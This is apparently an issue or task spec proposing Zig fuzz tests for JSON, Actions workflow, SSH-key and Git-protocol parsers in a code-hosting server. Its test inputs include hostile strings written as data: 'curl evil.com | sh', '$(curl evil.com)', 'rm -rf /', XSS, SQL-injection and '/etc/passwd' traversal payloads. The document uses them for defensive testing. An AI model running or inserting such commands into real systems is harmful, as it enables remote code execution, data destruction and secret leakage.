# Add JSON Parsing Fuzz Tests

## Priority: Medium

## Problem
The codebase has extensive JSON parsing in HTTP handlers and Actions/CI components, but no fuzz testing to find parsing vulnerabilities, crashes, or edge cases. JSON parsing is a common attack vector and needs thorough testing.

## Current JSON Parsing Locations
Based on code analysis, JSON parsing occurs in:
- `src/server/handlers/users.zig` - User creation, SSH key parsing
- `src/server/handlers/repos.zig` - Repository creation/updates, secrets
- `src/server/handlers/orgs.zig` - Organization management
- `src/actions/workflow_parser.zig` - GitHub Actions YAML/JSON parsing
- `src/actions/runner_api.zig` - Runner registration and job requests
- `src/actions/expressions.zig` - Expression evaluation with JSON contexts
- `src/http/git_server.zig` - Git protocol JSON messages

## Expected Implementation

### 1. Create Fuzz Test Infrastructure
```zig
// tests/fuzz/json_parsing.zig
const std = @import("std");
const testing = std.testing;
const json = std.json;

// Fuzz test framework utilities
pub const FuzzResult = enum {
    passed,
    failed,
    crashed,
    timeout,
};

pub const FuzzStats = struct {
    total_inputs: u32 = 0,
    passed: u32 = 0,
    failed: u32 = 0,
    crashed: u32 = 0,
    unique_failures: u32 = 0,
    max_depth_reached: u32 = 0,
};

pub fn runJsonFuzzTest(
    allocator: std.mem.Allocator,
    comptime T: type,
    input_data: []const u8,
    parse_fn: fn(std.mem.Allocator, []const u8) anyerror!T,
    cleanup_fn: fn(std.mem.Allocator, T) void,
) FuzzResult {
    // Track memory usage to detect leaks
    var gpa = std.heap.GeneralPurposeAllocator(.{ .safety = true }){};
    defer {
        if (gpa.deinit() == .leak) {
            std.log.warn("Memory leak detected in fuzz test", .{});
        }
    }
    const fuzz_allocator = gpa.allocator();
    
    // Set up timeout for hanging parsers
    var timer = std.time.Timer.start() catch return .crashed;
    const timeout_ns = 5 * std.time.ns_per_s; // 5 seconds
    
    // Parse with error handling
    const result = parse_fn(fuzz_allocator, input_data) catch |err| {
        if (timer.read() > timeout_ns) return .timeout;
        
        // Expected errors are OK (invalid JSON, etc.)
        switch (err) {
            error.SyntaxError,
            error.UnexpectedToken,
            error.InvalidNumber,
            error.InvalidCharacter,
            error.UnexpectedEndOfInput,
            error.OutOfMemory,
            => return .failed,
            else => {
                std.log.err("Unexpected error in JSON parsing: {}", .{err});
                return .crashed;
            },
        }
    };
    
    // Clean up if parsing succeeded
    cleanup_fn(fuzz_allocator, result);
    
    if (timer.read() > timeout_ns) return .timeout;
    return .passed;
}
```

### 2. User Handler JSON Fuzz Tests
```zig
// tests/fuzz/user_json_fuzz.zig
const std = @import("std");
const testing = std.testing;
const users_handler = @import("../../src/server/handlers/users.zig");
const json_utils = @import("../../src/server/utils/json.zig");

const CreateUserRequest = struct {
    name: []const u8,
    email: ?[]const u8 = null,
    password: ?[]const u8 = null,
    is_admin: bool = false,
};

fn parseUserJson(allocator: std.mem.Allocator, input: []const u8) !CreateUserRequest {
    return json_utils.parseFromSlice(CreateUserRequest, allocator, input);
}

fn cleanupUserJson(allocator: std.mem.Allocator, user: CreateUserRequest) void {
    json_utils.parseFree(CreateUserRequest, allocator, user);
}

test "fuzz user creation JSON parsing" {
    const allocator = testing.allocator;
    
    // Generate fuzz inputs
    const fuzz_inputs = [_][]const u8{
        // Valid cases
        "{\"name\":\"test\"}",
        "{\"name\":\"test\",\"email\":\"test@example.com\"}",
        "{\"name\":\"test\",\"email\":\"test@example.com\",\"is_admin\":true}",
        
        // Edge cases
        "{}",
        "{\"name\":\"\"}",
        "{\"name\":null}",
        "{\"name\":123}",
        "{\"name\":true}",
        "{\"name\":[]}",
        "{\"name\":{}}",
        
        // Deeply nested
        "{\"name\":{\"nested\":{\"deep\":{\"value\":\"test\"}}}}",
        
        // Very long strings
        "{\"name\":\"" ++ "a" ** 10000 ++ "\"}",
        
        // Unicode edge cases
        "{\"name\":\"\\u0000\\u001F\\u007F\\uFFFF\"}",
        "{\"name\":\"🦀💻🚀\"}",
        
        // Malformed JSON
        "{",
        "}",
        "{\"name\":}",
        "{\"name\":\"test\",}",
        "{\"name\":\"test\" \"email\":\"test\"}",
        "[\"name\":\"test\"]",
        
        // Injection attempts
        "{\"name\":\"<script>alert('xss')</script>\"}",
        "{\"name\":\"'; DROP TABLE users; --\"}",
        "{\"name\":\"../../../etc/passwd\"}",
        "{\"name\":\"\\x41\\x42\\x43\"}",
        
        // Memory exhaustion attempts
        "{\"name\":\"" ++ "\\u0000" ** 1000 ++ "\"}",
        "[" ++ "{\"name\":\"test\"}," ** 1000 ++ "{\"name\":\"test\"}]",
        
        // Parser confusion
        "{\"name\":\"test\\\"}",
        "{\"name\":\"test\\n\\r\\t\"}",
        "{\"name\":1e999}",
        "{\"name\":-0}",
        "{\"name\":18446744073709551615}", // u64 max
    };
    
    var stats = FuzzStats{};
    
    for (fuzz_inputs) |input| {
        stats.total_inputs += 1;
        
        const result = runJsonFuzzTest(
            allocator,
            CreateUserRequest,
            input,
            parseUserJson,
            cleanupUserJson,
        );
        
        switch (result) {
            .passed => stats.passed += 1,
            .failed => stats.failed += 1,
            .crashed => {
                stats.crashed += 1;
                std.log.err("Fuzz test crashed on input: {s}", .{input});
            },
            .timeout => {
                stats.crashed += 1;
                std.log.err("Fuzz test timed out on input: {s}", .{input});
            },
        }
    }
    
    std.log.info("User JSON fuzz test results: {} total, {} passed, {} failed, {} crashed", 
        .{ stats.total_inputs, stats.passed, stats.failed, stats.crashed });
    
    // Should not crash on any input
    try testing.expectEqual(@as(u32, 0), stats.crashed);
}

test "fuzz SSH key JSON parsing" {
    const allocator = testing.allocator;
    
    const SSHKeyRequest = struct {
        title: []const u8,
        key: []const u8,
    };
    
    const fuzz_inputs = [_][]const u8{
        // Valid SSH keys
        "{\"title\":\"My Key\",\"key\":\"ssh-rsa AAAAB3NzaC1yc2E...\"}",
        
        // Invalid key formats
        "{\"title\":\"Bad Key\",\"key\":\"not-a-key\"}",
        "{\"title\":\"Empty Key\",\"key\":\"\"}",
        "{\"title\":\"Binary Key\",\"key\":\"\\u0000\\u0001\\u0002\"}",
        
        // Very long keys (potential DoS)
        "{\"title\":\"Long Key\",\"key\":\"ssh-rsa " ++ "A" ** 100000 ++ "\"}",
        
        // Key injection attempts
        "{\"title\":\"Evil Key\",\"key\":\"ssh-rsa AAAAB3; rm -rf /\"}",
        "{\"title\":\"Command Key\",\"key\":\"$(curl evil.com)\"}",
        
        // Malformed requests
        "{\"title\":123,\"key\":\"ssh-rsa AAAAB3...\"}",
        "{\"key\":\"ssh-rsa AAAAB3...\"}",
        "{\"title\":\"Key Only\"}",
    };
    
    for (fuzz_inputs) |input| {
        const result = json_utils.parseFromSlice(SSHKeyRequest, allocator, input) catch |err| {
            // Expected errors are fine
            switch (err) {
                error.SyntaxError,
                error.MissingField,
                error.UnexpectedToken,
                => continue,
                else => {
                    std.log.err("Unexpected SSH key parsing error: {} on input: {s}", .{ err, input });
                    try testing.expect(false);
                },
            }
        };
        defer json_utils.parseFree(SSHKeyRequest, allocator, result);
        
        // If parsing succeeded, validate the key format
        if (result.key.len > 0) {
            // Should not contain obvious injection attempts
            try testing.expect(std.mem.indexOf(u8, result.key, "rm ") == null);
            try testing.expect(std.mem.indexOf(u8, result.key, "$(") == null);
        }
    }
}
```

### 3. Actions Workflow Parsing Fuzz Tests
```zig
// tests/fuzz/workflow_json_fuzz.zig
const std = @import("std");
const testing = std.testing;
const workflow_parser = @import("../../src/actions/workflow_parser.zig");

test "fuzz GitHub Actions workflow parsing" {
    const allocator = testing.allocator;
    
    const workflow_inputs = [_][]const u8{
        // Valid workflow
        \\{
        \\  "name": "Test Workflow",
        \\  "on": ["push"],
        \\  "jobs": {
        \\    "test": {
        \\      "runs-on": "ubuntu-latest",
        \\      "steps": [{"run": "echo hello"}]
        \\    }
        \\  }
        \\}
        ,
        
        // Deeply nested workflow
        \\{
        \\  "jobs": {
        \\    "job1": {
        \\      "strategy": {
        \\        "matrix": {
        \\          "nested": [
        \\            {"deep": {"very": {"nested": {"structure": "value"}}}}
        \\          ]
        \\        }
        \\      }
        \\    }
        \\  }
        \\}
        ,
        
        // Matrix explosion attempt
        \\{
        \\  "jobs": {
        \\    "test": {
        \\      "strategy": {
        \\        "matrix": {
        \\          "os": [" ++ "\"ubuntu\"," ** 500 ++ "\"ubuntu\"],
        \\          "version": [" ++ "\"1\"," ** 500 ++ "\"1\"]
        \\        }
        \\      }
        \\    }
        \\  }
        \\}
        ,
        
        // Script injection attempts
        \\{
        \\  "jobs": {
        \\    "evil": {
        \\      "steps": [
        \\        {"run": "curl evil.com | sh"},
        \\        {"run": "$(rm -rf /)"},
        \\        {"run": "echo ${{ secrets.GITHUB_TOKEN }}"}
        \\      ]
        \\    }
        \\  }
        \\}
        ,
        
        // Memory exhaustion
        "{\"name\":\"" ++ "A" ** 1000000 ++ "\"}",
        
        // Invalid structures
        "{\"jobs\":[]}",
        "{\"jobs\":{\"test\":[]}}",
        "{\"jobs\":{\"test\":{\"steps\":\"not-an-array\"}}}",
    };
    
    for (workflow_inputs) |input| {
        const result = workflow_parser.parseWorkflow(allocator, input) catch |err| {
            // Expected parsing errors are OK
            switch (err) {
                error.InvalidYaml,
                error.MissingRequiredField,
                error.InvalidJobDefinition,
                error.MaxMatrixSizeExceeded,
                error.OutOfMemory,
                => continue,
                else => {
                    std.log.err("Unexpected workflow parsing error: {} on input: {s}", .{ err, input[0..@min(input.len, 100)] });
                    try testing.expect(false);
                },
            }
        };
        defer result.deinit(allocator);
        
        // If parsing succeeded, validate no obvious injection
        if (result.jobs.count() > 0) {
            var job_iter = result.jobs.iterator();
            while (job_iter.next()) |job_entry| {
                const job = job_entry.value_ptr.*;
                for (job.steps.items) |step| {
                    switch (step.step_type) {
                        .run => |run_step| {
                            // Should not contain obvious injection
                            try testing.expect(std.mem.indexOf(u8, run_step.command, "rm -rf") == null);
                        },
                        else => {},
                    }
                }
            }
        }
    }
}

test "fuzz Actions expression evaluation" {
    const allocator = testing.allocator;
    
    const expression_inputs = [_][]const u8{
        // Simple expressions
        "${{ 'hello' }}",
        "${{ 1 + 2 }}",
        "${{ github.actor }}",
        
        // Complex expressions
        "${{ github.event.pull_request.head.ref }}",
        "${{ matrix.os }}-${{ matrix.version }}",
        
        // Injection attempts
        "${{ system('rm -rf /') }}",
        "${{ eval('malicious code') }}",
        "${{ secrets.PRIVATE_KEY }}",
        
        // Parser confusion
        "${{ ${{ nested }} }}",
        "${{ 'unclosed string",
        "${{ (((((deep_parens)))))) }}",
        "${{ 1/0 }}",
        "${{ '' + null }}",
        
        // Very long expressions
        "${{ '" ++ "A" ** 10000 ++ "' }}",
        "${{ " ++ "github.actor + " ** 1000 ++ "github.actor }}",
    };
    
    for (expression_inputs) |input| {
        const evaluator = workflow_parser.ExpressionEvaluator.init(allocator, &.{});
        const result = evaluator.evaluate(input) catch |err| {
            // Expected evaluation errors
            switch (err) {
                error.InvalidExpression,
                error.UndefinedVariable,
                error.TypeError,
                error.FunctionNotFound,
                => continue,
                else => {
                    std.log.err("Unexpected expression error: {} on input: {s}", .{ err, input });
                    try testing.expect(false);
                },
            }
        };
        defer result.deinit(allocator);
        
        // Should not allow system access or sensitive data exposure
        const result_str = try result.toString(allocator);
        defer allocator.free(result_str);
        
        try testing.expect(std.mem.indexOf(u8, result_str, "/etc/passwd") == null);
        try testing.expect(std.mem.indexOf(u8, result_str, "PRIVATE_KEY") == null);
    }
}
```

### 4. Protocol Parsing Fuzz Tests
```zig
// tests/fuzz/protocol_fuzz.zig
const std = @import("std");
const testing = std.testing;
const ssh_auth = @import("../../src/ssh/auth.zig");
const git_server = @import("../../src/http/git_server.zig");

test "fuzz SSH key parsing" {
    const allocator = testing.allocator;
    
    const ssh_key_inputs = [_][]const u8{
        // Valid keys
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7... user@host",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@host",
        
        // Invalid formats
        "not-a-key",
        "ssh-rsa",
        "ssh-rsa invalid-base64",
        "ssh-rsa AAAAB3NzaC1yc2E", // Too short
        
        // Binary data
        "\x00\x01\x02\x03\x04\x05",
        "\xFF\xFE\xFD\xFC",
        
        // Very long keys
        "ssh-rsa " ++ "A" ** 100000,
        
        // Key type confusion
        "ssh-dss AAAAB3NzaC1kc3MAAACB...", // DSS not allowed
        "ssh-rsa-cert-v01@openssh.com AAAAB3...", // Certificate
        
        // Comment injection
        "ssh-rsa AAAAB3... user@host; rm -rf /",
        "ssh-rsa AAAAB3... $(curl evil.com)",
        "ssh-rsa AAAAB3... user@host\nmalicious_command",
    };
    
    for (ssh_key_inputs) |input| {
        const result = ssh_auth.PublicKey.parse(allocator, input) catch |err| {
            // Expected parsing errors
            switch (err) {
                error.InvalidKeyFormat,
                error.UnsupportedKeyType,
                error.InvalidBase64,
                => continue,
                else => {
                    std.log.err("Unexpected SSH parsing error: {} on input: {s}", .{ err, input[0..@min(input.len, 50)] });
                    try testing.expect(false);
                },
            }
        };
        defer result.deinit(allocator);
        
        // Should not contain injection in comment
        try testing.expect(std.mem.indexOf(u8, result.comment, "rm ") == null);
        try testing.expect(std.mem.indexOf(u8, result.comment, "$(") == null);
        try testing.expect(std.mem.indexOf(u8, result.comment, "\n") == null);
    }
}

test "fuzz Git protocol parsing" {
    const allocator = testing.allocator;
    
    const git_requests = [_][]const u8{
        // Valid Git requests
        "0000",
        "0006a\n",
        "001e# service=git-upload-pack\n",
        "0000",
        
        // Malformed packets
        "FFFF",
        "0001",
        "0002a",
        "",
        
        // Binary data
        "\x00\x01\x02\x03",
        "\xFF\xFE\xFD\xFC",
        
        // Very long packets
        "FFFF" ++ "A" ** 65531,
        
        // Command injection
        "001e# service=git-upload-pack; rm -rf /\n",
        "001e$(curl evil.com)\n",
    };
    
    for (git_requests) |input| {
        // Test with the actual Git protocol parser
        var stream = std.io.fixedBufferStream(input);
        const result = git_server.parseGitRequest(allocator, stream.reader()) catch |err| {
            // Expected protocol errors
            switch (err) {
                error.InvalidPacketLength,
                error.MalformedRequest,
                error.UnknownService,
                => continue,
                else => {
                    std.log.err("Unexpected Git protocol error: {} on input: {any}", .{ err, std.fmt.fmtSliceHexLower(input[0..@min(input.len, 20)]) });
                    try testing.expect(false);
                },
            }
        };
        defer result.deinit(allocator);
        
        // Should not contain injection
        try testing.expect(std.mem.indexOf(u8, result.service, "rm ") == null);
        try testing.expect(std.mem.indexOf(u8, result.service, "$(") == null);
    }
}
```

### 5. Build Integration
```zig
// Add to build.zig
const fuzz_tests = b.addTest(.{
    .root_source_file = b.path("tests/fuzz/main.zig"),
    .target = target,
    .optimize = optimize,
});

// Add fuzzing dependencies
fuzz_tests.root_module.addImport("json", json_module);
fuzz_tests.root_module.addImport("workflow_parser", workflow_parser_module);

const run_fuzz_tests = b.addRunArtifact(fuzz_tests);
const fuzz_step = b.step("fuzz", "Run fuzz tests");
fuzz_step.dependOn(&run_fuzz_tests.step);
```

## Files to Create
- `tests/fuzz/main.zig` (fuzz test runner)
- `tests/fuzz/json_parsing.zig` (JSON fuzz infrastructure)
- `tests/fuzz/user_json_fuzz.zig` (User handler fuzzing)
- `tests/fuzz/workflow_json_fuzz.zig` (Actions workflow fuzzing)
- `tests/fuzz/protocol_fuzz.zig` (Protocol parsing fuzzing)

## Files to Modify
- `build.zig` (add fuzz test target)

## Benefits
- Find parsing vulnerabilities before attackers do
- Discover edge cases that cause crashes or hangs
- Validate input sanitization and injection prevention
- Improve parser robustness and error handling
- Catch memory leaks in parsing code

## Testing Strategy
1. **Start with structured fuzzing** using known input formats
2. **Add mutation-based fuzzing** for discovering unknown edge cases
3. **Monitor memory usage** to catch leaks and excessive allocation
4. **Track code coverage** to ensure all parsing paths are tested
5. **Run continuously** in CI to catch regressions

## Success Criteria
- No crashes or hangs on any fuzz input
- No memory leaks detected
- Proper error handling for all malformed inputs
- No successful injection attacks through parsing
- High code coverage of parsing logic